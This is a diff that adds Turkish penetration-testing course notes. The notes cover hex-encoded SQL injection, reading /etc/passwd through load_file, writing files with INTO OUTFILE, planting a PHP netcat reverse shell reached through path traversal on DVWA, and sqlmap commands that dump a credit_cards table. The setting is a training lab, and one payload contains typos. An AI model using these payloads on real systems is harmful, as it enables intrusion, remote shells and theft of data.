@@ -1065,8 +1065,69 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2012.45.51.jpeg)
 
 > ## SQL Injection HEX Vermek
+
+- Komut içindeki filtrelenmiş şeylerden nası kaçıcağımızı bulduktan sonra komutları o şekilde yazarak sütun ismi, veritabanı ismi gibi şeyleri çekebiliriz
+- Bazı durumlarda filtreden kurtulmak için yazdığımız şeyleri ```text``` olarak değil ```hex``` olarak vermemiz gerekebilir (e.g. ```'``` -> 0x27)
+- ```Text```'i ```Hex```'e çevirmek için ```burpsuite decoder``` kısımına bakabiliriz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.04.36.jpeg)
+
+- ```1%27union select 1,table_name from information_schema.tables where table_schema='dvwa'``` yerine ```1%27 union select 1,table_name from information_schema.tables where table_schema=0x64767761``` şeklinde yazabiliriz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.08.13.jpeg)
+
 # Database'in Bulunduğu Sunucudaki Dosyaları Okuma ve Yazma
 > ## Veri Okuma
+
+- ```User ID: 1' union select 1,load_file(' /etc/passwd')#``` yazarak o dosyayı okuyabiliyor muyuz diye deniyoruz
+- Bazı durumlarda 1 yerine ```null``` yazmak gerekebiliyor
+- Duruma göre yine bazı karakter filtrelemerinden kaçmak için karakterleri ya da kelimeleri farklı şekilde yazmamız gerekebilir
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.47.18.jpeg)
+
 > ## Veri Yazma
+
+- ```User ID: 1' union select 1,'test' into outfile '/tmp/test.txt'#``` yazarak "tmp" içine "test.txt" oluşturup onun içine "test" yazdırabiliriz
+- İlk olarak ```/tmp``` içine yazdırmayı deneriz eğer oraya yazdıramazsak başka hiçbir yere yazdıramayız demektir
+- Komutu yazdırıp yazdıramadığımızı test etmek için ```load_file``` çalıştırabiliriz
+- ```User ID: 1' union select 1,load_file(' /tmp/test.txt')#```
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2013.50.39.jpeg)
+
 > ## PHP Dosyasını Veri Olarak Eklemek
+
+- Veri yazdırabileceğimizi öğrendik artık bunu kullanarak sunucu içine ```.php``` dosyası ekleyerek shell oluşturmayı deneyeceğiz
+- ```<?passthru("nc 192.168.123.123 1234 -e /bin/sh");?>``` kodunu kullanacağız (```/bin/sh``` yerine ```/bin/bash``` yazabiliriz)
+- ```User ID: 1' union select("nc 192.168.123.123 1234 -e /bin/sh");?> infot outfile '/tmp/myshell.php'#``` yazıp kodu yüklemeyi deniyoruz ("/tmp/myshell.php" yerine linux sunucu ise "/var/www/{site adı}/myshell.php" deneyebiliriz
+- Terminali açarak ```nc -nvlp 1234``` ile dinlemeye başlıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2014.14.07.jpeg)
+
+- Siteye dönüyoruz ve URL kısmına gelerek php dosyasını yüklediğimiz konuma gitmeyi deniyoruz (/tmp/myshell.php)
+- Bunun için ```http://192.168.126.132/dvwa/vulnerabilities/fi/?page=../../../../../tmp/myshell.php``` kullanıyoruz ("../" kullanarak geri gidiyoruz ve kaç tane "../" kullanıcağımızı deniyoruz)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2014.17.45.jpeg)
+
+- Açık shelli tespit ettikten sonra ls, pwd, cd gibi komutlarla gezinebiliriz
+
 # SQL Map
+
+- Sızma testi yapacağımız sitede SQL açığı var mı diye test edebileceğimiz bir framework'tür 
+- Siteye girdikten sonra giriş yapmayı deniyoruz ve URL'yi kopyalıyoruz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2016.11.55.jpeg)
+
+- Terminali açıyoruz, ```sqlmap -u "http://192.168.123.123...{site URL'si}"``` olarak giriyoruz ve açık var mı test ediyoruz
+- ```sqlmap -u "http://192.168.123.123..." --current -db``` -> Sitenin güncel databaselerini gösterir
+- ```sqlmap -u "http://192.168.123.123..." --tables -D owasp10``` -> "owasp10" içindeki tabloları gösterir
+- ```sqlmap -u "http://192.168.123.123..." --columns -T credit_cards -D owasp10``` -> "owasp10" içindeki "credit_cards" tablosundaki sütun isimlerini gösterir
+- ```sqlmap -u "http://192.168.123.123..." -T credit_cards -D owasp10 --dump``` -> "credit_cards" içindeki bilgileri gösterir
+  - ```-D```: Database İsmi
+  - ```--columns```: Sütunları Gösterir
+  - ```--tables```: Tabloları Gösterir
+  - ```--current -db```: Aktif Databaseleri Gösterir
+  - ```-T```: Tablo ismi
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a07c42c309f95917cee20dfd39aee5ae5bf41705/Pictures/WhatsApp%20Image%202022-09-16%20at%2016.15.09.jpeg)
+
+
